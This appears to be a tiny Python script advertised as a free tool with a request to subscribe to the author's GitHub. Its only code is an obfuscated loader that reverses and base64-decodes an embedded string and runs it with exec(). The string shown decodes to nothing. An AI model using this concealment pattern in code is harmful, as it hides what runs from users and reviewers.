# Created by MrUser#
#Free Tool for now#
#Please subcribe to my account github#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))